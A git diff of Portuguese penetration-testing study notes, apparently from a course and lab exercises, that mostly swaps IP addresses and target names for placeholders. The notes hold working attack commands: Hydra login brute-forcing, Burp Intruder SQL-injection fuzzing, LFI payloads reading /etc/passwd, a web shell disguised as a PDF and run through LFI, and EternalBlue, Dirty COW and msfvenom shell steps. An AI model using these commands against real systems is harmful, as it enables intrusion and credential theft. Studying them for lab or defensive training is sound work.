+Mandar o campo que deseja fazer intrusão para o INTRUDER do burpe suite e carregar a lista para fazer o bruteforce, podendo fazer o filtro pela palavra para saber quais palavras da wordlist é válida, ou está ativa. Na aula foi usado o link `192.168.1.10/turismo/ativar-conta.php` no parâmetro `login=`
 
 - Fuzzing de Vulnerabilidade com o Burp
 
 Fazer um bruteforce no burp com uma wordlist da seclists própria de fuzzing, dessa forma encontrando uma vulnerabilidade dando bypass na aplicação
 
-Depois que interceptar a página, envia para o intruder, em Positions, limpa todas e adiciona apenas a posição que deseja. Em payload carregar a lista que precisa, no caso fuzzing na seclists. Depois adiciona em options->grep a palavra que vai identificar se deu certo ou não (resposta da aplicação), no caso Incorreto e adiciona SQL para notificar de erros SQL. Quando rodar, verificar onde não tem flag setada em incorreto e sql, pois possivelmente este será o payload correto. Para saber o payload basta selecionar e dar um send to decoder e fazer a decodificação de URL. O status possivelmente será 302 (redirecionamento) que possivelmente é o payload correto. Quando encontrar uma falha time-based enviar para o repeater e alterar o parâmetro Time e fazer o teste.. Os testes foram feitos na página de login e adm do host 172.16.1.10.
+Depois que interceptar a página, envia para o intruder, em Positions, limpa todas e adiciona apenas a posição que deseja. Em payload carregar a lista que precisa, no caso fuzzing na seclists. Depois adiciona em options->grep a palavra que vai identificar se deu certo ou não (resposta da aplicação), no caso Incorreto e adiciona SQL para notificar de erros SQL. Quando rodar, verificar onde não tem flag setada em incorreto e sql, pois possivelmente este será o payload correto. Para saber o payload basta selecionar e dar um send to decoder e fazer a decodificação de URL. O status possivelmente será 302 (redirecionamento) que possivelmente é o payload correto. Quando encontrar uma falha time-based enviar para o repeater e alterar o parâmetro Time e fazer o teste.. Os testes foram feitos na página de login e adm do host 192.168.1.10.
 
 - Teste de LFI com BURPSUITE - Local File Inclusion
 
@@ -4134,7 +4134,7 @@ Fazer da mesma forma como explicado acima, porém no parâmetro `sobre.php` na u
 
 - Personalizando regras com Intruder do Burp Suite
 
-Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por `:` se for o caso da aplicação. Em payloads Sets: `Custom Interator` Em Separator position: `:` Em payload Processing: Adicionar o tipo de encode, no exemplo `base64`. Host usado 172.16.1.10/logs
+Quando não conseguir enxergar os parâmetros que foram inseridos no form da página, verificar se não está encodado, assim possibilitando fazer uma personalização dos parâmetros enviando para o intruder, após descobrir qual encode a aplicação usa, e personalizar a wordlist separando por `:` se for o caso da aplicação. Em payloads Sets: `Custom Interator` Em Separator position: `:` Em payload Processing: Adicionar o tipo de encode, no exemplo `base64`. Host usado 192.168.1.10/logs
 
 - Realizando ataques com o Intruder - Burp
 
@@ -4157,7 +4157,7 @@ Quando não conseguir enxergar os parâmetros que foram inseridos no form da pá
 
 Realizando ataques de força bruta HYDRA
 
-    hydra -v -L users.txt -P pass.txt 172.16.1.10 http-post-ou-get-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"
+    hydra -v -L users.txt -P pass.txt 192.168.1.10 http-post-ou-get-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:incorreto"
 
     hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.0.2 http-post-form "/app/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:MSG-FALHA" -I
 
@@ -4206,7 +4206,7 @@ Fazer o upload de um arquivo .htaccess pedindo para a aplicação interpretar co
 
 - Bypass Upload: Tipo de conteúdo
 
-Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('desec.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://172.16.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final
+Quando a aplicação trava o envio de uma extensão diferente da que ele permite tanto pelo tipo do arquivo `.pdf` quanto pelo head `%PDF-1.5` É nesse caso necessário criar o script com a extensão `.php.pdf` com o head `%PDF-1.5`. para que a aplicação aceite o upload. Para fazer o teste, criar um script php com o comando  `echo mime_content_type('desec.php.pdf');`  e ver se o script reconhece como pdf de fato contendo o head com a flag pdf. Nisso subir o arquivo para a aplicação e usar a falha de LFI para acessar o arquivo e executar comandos em `http://192.168.1.231/index.php?page=uploads/shell-get.php.pdf%00&kidman=id` Os caracteres `%00` servem para ignorar a extensao `.pdf`  no final
 
 - Bypass de Upload de Imagens
 
@@ -4231,7 +4231,7 @@ São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obt
 
     index.php?page=File:///../../../etc/passwd 
 
-    index.php?page=data://text/plan,DESEC 
+    index.php?page=data://text/plan,KidMan 
 
     index.php/data://text/plan;base64,REVTRUM= 
 
@@ -4502,7 +4502,7 @@ Atacante
 
         ssh www-data@127.0.0.1 -p 2222 -i chave 
 
-        ssh camila@172.16.1.31 -i id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa
+        ssh camila@192.168.1.31 -i id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa
 
 Conecta com o servidor alvo usando a chave public&private
 
@@ -4981,17 +4981,17 @@ Vai gerar um arquivo para ler no wireshark
 
 THAT'S ALL FOLKS
 
-### PENTEST EXPERIENCE
+### HANDS ON
 
-- KLIS
+- Company 2
 
-Host KLIS: 
+Host Second: 
 
         https://www.100security.com.br/ms17-010 #eternalblue #doublepulsar 
 
 192.168.1.145
 
-Alternativo Host KLIS 145:  
+Alternativo Host Company 2 145:  
 
         https://github.com/sailay1996/eternal-pulsar
 
@@ -5028,7 +5028,7 @@ Na shell do alvo:
 
 .
 
-	rdesktop 172.16.1.145 
+	rdesktop 192.168.1.145 
 
 Acessa a máquina com login e senha criado acima
 
@@ -5075,7 +5075,7 @@ importar o arquivo no alvo (dar permissão) e executar
 
 
 
-- CNIETYB
+- Company 3
 
 Hosts:
 
@@ -5088,7 +5088,7 @@ Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o explo
 Ao pegar o shadow e passwd, quebrar as senhas e acessar o server via ssh,ftp...
 
 
-- ROGLA
+- Company 4
 
 192.168.1.116
 
@@ -5122,13 +5122,13 @@ Site para procurar comando de escalar privilégios
 Site para montar shell reverso https://www.revshells.com/
 
 
-- QAMNULA
+- Company 5
 
 Host: 192.168.1.158
 
 Bruteforce usado Hydra
 
-	hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I
+	hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I
 
 Exploit 45010 encontrado pelo less.sh
 
@@ -5141,7 +5141,7 @@ Quebrar senha xls planilha scheets:
         https://www.password-find.com/crack_office_password_js.htm
 
 
-- WCWG
+- Company 6
 
 192.168.1.110
 
@@ -5167,7 +5167,7 @@ Exploração via Kernel usando o metasploit com banco de dados, abrindo sessão 
 Ajuda: https://mysnippets443.wordpress.com/2020/03/09/metasploit-establish-a-ssh-session-for-further-use/
 
 
-- CEPSORP          
+- Company 7          
 
 192.168.1.139
 
@@ -5188,7 +5188,7 @@ Login e senha encontrado no lab anterior
 Upload de payload .war e ganha a shell
 
 
-- ALSA
+- Company 8
 
 
 192.168.1.155 
@@ -5221,7 +5221,7 @@ Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.168.1
 Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.
 
 
-- CINVED
+- Company 9
 
 192.168.1.159
 
@@ -5272,7 +5272,7 @@ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://security.stackexchange.com/questions/145325/exploiting-dirty-cow-using-metasploit
 
 
-NOVA GERAÇÃO DE PENTEST PROFISSIONAL (DECSTORE)
+- Company 1
 
     script nomedoarquivo
 
@@ -5282,7 +5282,7 @@ Salva/grava todo terminal até da EXIT
 
 Envia/aumenta ao envio de pacotes para o host (detecção mais rápida)
 
-    gobuster dir -u http://decstore.com.br -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -x php,bkp,old,txt,xml
+    gobuster dir -u http://kidman.com.br -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -x php,bkp,old,txt,xml
 
 Bruteforce nos diretórios do domínio com 100 threads url completa sem retorno de erro, seguir caminho de redirecionamento e gravar tudo no arquivo gobuster com tipos de arquivos, dessa forma procurando por entry points.
 
@@ -5293,7 +5293,7 @@ Nota: Seclists baixar pasta de wordlists do github
 
 Retorna a quantidade de linhas no arquivo
 
-    hydra -v -t10 -l decstore -P wordlist ftp://decstore.com.br -s 2121 
+    hydra -v -t10 -l kidman -P wordlist ftp://kidman.com.br -s 2121 
 
 Faz um ataque de força bruta usando o hydra com 10 threads na porta 2121 (diferente da padrão)
 
@@ -5476,7 +5476,7 @@ TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT
 
 Ferramenta animal par ENUMERAÇÃO WEB
 
-        wapiti --url http://rh.businesscorp.com.br/
+        wapiti --url http://rh.kidmancompany.com.br/
 
 Fazendo tunelamento com NGROK
 
